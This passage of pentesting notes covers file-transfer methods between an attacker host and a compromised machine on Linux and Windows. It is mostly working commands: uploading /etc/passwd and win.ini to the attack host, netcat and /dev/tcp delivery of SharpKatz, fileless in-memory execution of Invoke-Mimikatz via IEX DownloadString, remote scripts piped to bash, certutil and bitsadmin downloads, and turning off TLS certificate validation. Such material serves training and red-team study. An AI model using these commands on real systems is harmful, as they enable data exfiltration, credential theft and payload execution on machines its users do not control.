Request</p> <pre><code>secops@kali[/kali]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3\n</code></pre> <p>Print the Response <pre><code>secops@kali[/kali]$ cat &lt;&amp;3\n</code></pre></p>  SSH Downloads <p>Before we begin downloading files from our target Linux machine to our Attacker Host, let's set up an SSH server in our Attacker Host.</p> <p>Enabling the SSH Server</p> <pre><code>secops@kali[/kali]$ sudo systemctl enable ssh\n\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.\nExecuting: /lib/systemd/systemd-sysv-install enable ssh\nUse of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, &lt;DATA&gt; line 45\n...SNIP...\n</code></pre> <p>Starting the SSH Server <pre><code>secops@kali[/kali]$ sudo systemctl start ssh\n</code></pre></p> <p>Checking for SSH Listening Port <pre><code>secops@kali[/kali]$ netstat -lnpt\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - \n</code></pre></p> <p>Now we can begin transferring files. We need to specify the IP address of our Attacker Host and the username and password.</p> <p>Linux - Downloading Files Using SCP</p> <pre><code>secops@kali[/kali]$ scp plaintext@192.168.49.128:/root/myroot.txt . \n</code></pre>  Web File Transfer Methods <p>Linux - Creating a Web Server with Python3 <pre><code>secops@kali[/kali]$ python3 -m http.server\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre></p> <p>Linux - Creating a Web Server with Python2.7 <pre><code>secops@kali[/kali]$ python2.7 -m SimpleHTTPServer\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre></p> <p>Linux - Creating a Web Server with PHP <pre><code>secops@kali[/kali]$ php -S 0.0.0.0:8000\n\n[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started\n</code></pre></p> <p>Linux - Creating a Web Server with Ruby <pre><code>secops@kali[/kali]$ ruby -run -ehttpd . -p8000\n\n[2022-05-23 09:35:46] INFO  WEBrick 1.6.1\n[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]\n[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000\n</code></pre></p>  SCP Upload <p>File Upload using SCP <pre><code>secops@kali[/kali]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/\n\nplaintext@192.168.49.128's password: \npasswd         \n</code></pre></p>","title":"Linux"},{"location":"file_transfers/living_off_the_land/","text":"LOLBAS <p>To search for download and upload functions in LOLBAS we can use <code>/download</code> or <code>/upload</code>.</p> <p></p> <p>CertReq.exe example.</p> <p>We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.</p> <p>Upload win.ini to our attackhost <pre><code>C:\\xyz&gt; certreq.exe -Post -config http://192.168.49.128/ c:\\windows\\win.ini\nCertificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)\n</code></pre></p> <p>This will send the file to our Netcat session, and we can copy-paste its contents.</p> <p>File Received in our Netcat Session <pre><code>secops@kali[/kali]$ sudo nc -lvnp 80\n\nlistening on [any] 80 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819\nPOST / HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nContent-Type: application/json\nUser-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)\nContent-Length: 92\nHost: 192.168.49.128\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n</code></pre></p>  GTFOBINS <p>To search for the download and upload function in GTFOBins for Linux Binaries, we can use <code>+file download</code> or <code>+file upload</code>.</p> <p></p> <p>OpenSSL Example:</p> <p>We need to create a certificate and start a server in our attackhost.</p> <p>Create Certificate in our attackhost <pre><code>secops@kali[/kali]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n\nGenerating a RSA private key\n.......................................................................................................+++++\n................+++++\nwriting new private key to 'key.pem'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\n</code></pre></p> <p>Stand up the Server in our attackhost <pre><code>secops@kali[/kali]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh\n</code></pre></p> <p>With the server running, we need to download the file from the compromised machine.</p> <pre><code>secops@kali[/kali]$ openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh\n</code></pre>  Other common Living off the Land tools <p>Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It \"intelligently\" checks host and network utilization into account to minimize the impact on a user's foreground work.</p> <p>File Download with Bitsadmin <pre><code>PS C:\\xyz&gt; bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe\n</code></pre></p> <p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.</p> <p>Download <pre><code>PS C:\\xyz&gt; Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32/nc.exe\" -Destination \"C:\\Temp\\nc.exe\"\n</code></pre></p> <p>Upload <pre><code>PS C:\\xyz&gt; Start-BitsTransfer \"C:\\Temp\\bloodhound.zip\" -Destination \"http://10.10.10.132/uploads/bloodhound.zip\" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential LEGALCORP\\svc-sql\n</code></pre></p>  Certutil <p>Available in all Windows versions, serving as a defacto <code>wget</code> for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.</p> <p>Download a File with Certutil <pre><code>C:\\xyz&gt; certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe\n</code></pre></p>","title":"LOTL"},{"location":"file_transfers/miscellaneous_file_transfer_methods/","text":"Netcat <p>We'll first start Netcat <code>nc</code> on the compromised machine, listening with option <code>-l</code> on port 8000, with the option <code>-p 8000</code>, and redirect the stdout using a single greater-than <code>&gt;</code> followed by the filename, <code>SharpKatz.exe</code>.</p> <p>Compromised Machine - Listenting on Port 8000 <pre><code>victim@target:~$ nc -l -p 8000 &gt; SharpKatz.exe\n</code></pre></p> <p>From our Attacker Host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option <code>-q 0</code> will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.</p> <p>Attackhost - Sending File to Compromised machine <pre><code>secops@kali[/kali]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\nsecops@kali[/kali]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe\n</code></pre></p>  <p>Instead of listening on our compromised machine, we can connect to a port on our attackhost to perform the file transfer operation. Listen on port 80 on our attacker host and send the file SharpKatz.exe as input to Netcat.</p> <p>Attackhost - Sending File as Input to Netcat <pre><code>secops@kali[/kali]$ sudo nc -l -p 80 -q 0 &lt; SharpKatz.exe\n</code></pre></p> <p>Compromised Machine Connect to Netcat to Receive the File <pre><code>victim@target:~$ nc 192.168.49.128 80 &gt; SharpKatz.exe\n</code></pre></p> <p>If we don't have Netcat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.</p> <p>attackhost - Sending File as Input to Netcat <pre><code>secops@kali[/kali]$ sudo nc -l -p 80 -q 0 &lt; SharpKatz.exe\n</code></pre></p> <p>Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File <pre><code>victim@target:~$ cat &lt; /dev/tcp/192.168.49.128/80 &gt; SharpKatz.exe\n</code></pre></p>  PowerShell Session File Transfer <p>Create a PowerShell Remoting Session to DATABASE01 <pre><code>PS C:\\xyz&gt; $Session = New-PSSession -ComputerName DATABASE01\n</code></pre></p> <p>Copy samplefile.txt from our Localhost to the DATABASE01 Session <pre><code>PS C:\\xyz&gt; Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n</code></pre></p> <p>Copy DATABASE.txt from DATABASE01 Session to our Localhost <pre><code>PS C:\\xyz&gt; Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre></p>","title":"Miscellaneous"},{"location":"file_transfers/protected_file_transfers/","text":"File Encryption on Windows <p>Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the Invoke-AESEncryption.ps1 PowerShell script. This script is small and provides encryption of files and strings.</p> <p>Invoke-AESEncryption.ps1 <pre><code>#Encrypts the string \"Secret Test\" and outputs a Base64 encoded ciphertext.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n\n#Decrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n\n#Encrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n\n#Decrypts the file \"file.bin.aes\" and outputs an encrypted file \"file.bin\"\n#&gt;\nfunction Invoke-AESEncryption {\n    [CmdletBinding()]\n    [OutputType([string])]\n    Param\n    (\n        [Parameter(Mandatory = $true)]\n        [ValidateSet('Encrypt', 'Decrypt')]\n        [String]$Mode,\n\n        [Parameter(Mandatory = $true)]\n        [String]$Key,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\n        [String]$Text,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\n        [String]$Path\n    )\n\n    Begin {\n        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed\n        $aesManaged = New-Object System.Security.Cryptography.AesManaged\n        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $aesManaged.BlockSize = 128\n        $aesManaged.KeySize = 256\n    }\n\n    Process {\n        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n\n        switch ($Mode) {\n            'Encrypt' {\n                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName + \".aes\"\n                }\n\n                $encryptor = $aesManaged.CreateEncryptor()\n                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n                $encryptedBytes = $aesManaged.IV + $encryptedBytes\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File encrypted to $outPath\"\n                }\n            }\n\n            'Decrypt' {\n                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName -replace \".aes\"\n                }\n\n                $aesManaged.IV = $cipherBytes[0..15]\n                $decryptor = $aesManaged.CreateDecryptor()\n                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File decrypted to $outPath\"\n                }\n            }\n        }\n    }\n\n    End {\n        $shaManaged.Dispose()\n        $aesManaged.Dispose()\n    }\n}\n</code></pre></p> <p>After the script has been transferred, it only needs to be imported as a module.</p> <pre><code>PS C:\\xyz&gt; Import-Module .\\Invoke-AESEncryption.ps1\n</code></pre> <p>This command creates an encrypted file with the same name as the encrypted file but with the extension \"<code>.aes</code>\"</p> <p>File Encryption Example <pre><code>PS C:\\xyz&gt; Invoke-AESEncryption.ps1 -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n\nFile encrypted to C:\\xyz\\scan-results.txt.aes\nPS C:\\xyz&gt; ls\n\n    Directory: C:\\xyz\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1\n-a----        11/18/2020  12:19 PM           1724 scan-results.txt\n-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes\n</code></pre></p>  File Encryption on Linux <p>Encrypting /etc/passwd with openssl <pre><code>secops@kali[/kali]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n\nenter aes-256-cbc encryption password:                                                         \nVerifying - enter aes-256-cbc encryption password:                              \n</code></pre></p> <p>Decrypt passwd.enc with openssl <pre><code>secops@kali[/kali]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    \n\nenter aes-256-cbc decryption password:\n</code></pre></p>","title":"Protected File Transfers"},{"location":"file_transfers/transfering_files_w_code/","text":"Python <p>Python 2 - Download</p> <pre><code>secops@kali[/kali]$ python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre> <p>Python 3 - Download <pre><code>secops@kali[/kali]$ python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre></p>  PHP <p>PHP Download with File_get_contents()</p> <pre><code>secops@kali[/kali]$ php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre> <p>PHP Download with Fopen() <pre><code>secops@kali[/kali]$ php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre></p> <p>PHP Download a File and Pipe it to Bash <pre><code>secops@kali[/kali]$ php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n</code></pre></p>  Other Languages <p>Ruby - Download a File <pre><code>secops@kali[/kali]$ ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre></p> <p>Perl - Download a File <pre><code>secops@kali[/kali]$ perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre></p>  JavaScript <p>The following JavaScript code is based on this post, and we can download a file using it. Create a file called <code>wget.js</code> and save the following content:</p> <pre><code>var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n</code></pre> <p>Download a File Using JavaScript and cscript.exe <pre><code>C:\\xyz&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre></p>  VBScript <p>The following VBScript example can be used based on this. Create a file called <code>wget.vbs</code> and save the following content:</p> <pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre> <p>From a Windows command prompt or PowerShell terminal</p> <pre><code>C:\\xyz&gt; cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>  Upload Operations using Python3 <p>If we want to upload a file to our Python3 uploadserver.</p> <p>Starting the Python uploadserver Module <pre><code>secops@kali[/kali]$ python3 -m uploadserver \n\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre></p> <p>Uploading a File Using a Python One-liner <pre><code>secops@kali[/kali]$ python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n</code></pre></p> <p>Breakdown: <pre><code># To use the requests function, we need to import the module first.\nimport requests \n\n# Define the target URL where we will upload the file.\nURL = \"http://192.168.49.128:8000/upload\"\n\n# Define the file we want to read, open it and save it in a variable.\nfile = open(\"/etc/passwd\",\"rb\")\n\n# Use a requests POST request to upload the file. \nr = requests.post(url,files={\"files\":file})\n</code></pre></p>","title":"Transfering Files with Code"},{"location":"file_transfers/windows_file_transfer_methods/","text":"Powershell Web Downloads    Method Description     OpenRead Returns the data from a resource as a Stream.   OpenReadAsync Returns the data from a resource without blocking the calling thread.   DownloadData Downloads data from a resource and returns a Byte array.   DownloadDataAsync Downloads data from a resource and returns a Byte array without blocking the calling thread.   DownloadFile Downloads data from a resource to a local file.   DownloadFileAsync Downloads data from a resource to a local file without blocking the calling thread.   DownloadString Downloads a String from a resource and returns a String.   DownloadStringAsync Downloads a String from a resource without blocking the calling thread.    <p>File Download <pre><code>PS C:\\xyz&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\xyz&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\xyz&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\xyz&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n</code></pre></p> <p>PowerShell DownloadString - Fileless Method</p> <p>Fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias <code>IEX</code>.</p> <pre><code>PS C:\\xyz&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n</code></pre> <p><code>IEX</code> also accepts pipeline input.</p> <pre><code>PS C:\\xyz&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre> <p>PowerShell Invoke-WebRequest</p> <p>From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name.</p> <pre><code>PS C:\\xyz&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n</code></pre> <p>Common Errors with PowerShell</p> <p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.</p> <pre><code>PS C:\\xyz&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\xyz&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX\n</code></pre> <p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command: <pre><code>PS C:\\xyz&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nException calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust\nrelationship for the SSL/TLS secure channel.\"\nAt line:1 char:1\n+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\nPS C:\\xyz&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre></p>  SMB Downloads <p>We can use SMB to download files from our Host easily. We need to create an SMB server on our Host with smbserver.py from Impacket and then use <code>copy</code>, <code>move</code>, PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB.</p> <p>Create the SMB Server <pre><code>secops@kali[/kali]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre></p> <p>Copy a File from the SMB Server <pre><code>C:\\xyz&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n</code></pre></p> <p>New versions of Windows block unauthenticated guest access, as we can see in the following command:</p> <pre><code>C:\\xyz&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n</code></pre> <p>To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:</p> <pre><code>secops@kali[/kali]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre> <p>Mount the SMB Server with Username and Password <pre><code>C:\\xyz&gt; net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\xyz&gt; copy n:\\nc.exe\n        1 file(s) copied.\n</code></pre></p>  FTP Downloads <p>We can configure an FTP Server in our attack host using Python3 <code>pyftpdlib</code> module. </p> <p>Installing the FTP Server Python3 Module - pyftpdlib <pre><code>secops@kali[/kali]$ sudo pip3 install pyftpdlib\n</code></pre></p> <p>Setting up a Python3 FTP Server <pre><code>secops@kali[/kali]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;\n</code></pre></p> <p>Transfering Files from an FTP Server Using PowerShell <pre><code>PS C:\\xyz&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n</code></pre></p>  <p>There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for Uploads. </p> PowerShell Base64 Encode &amp; Decode <p>Encode File Using PowerShell <pre><code>PS C:\\xyz&gt; [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\nPS C:\\xyz&gt; Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n</code></pre></p> <p>Copy this content and paste it into our attack host, use the <code>base64</code> command to decode it, and use the <code>md5sum</code> application to confirm the transfer happened correctly.</p> <p>Decode Base64 String in Linux <pre><code>secops@kali[/kali]$ echo 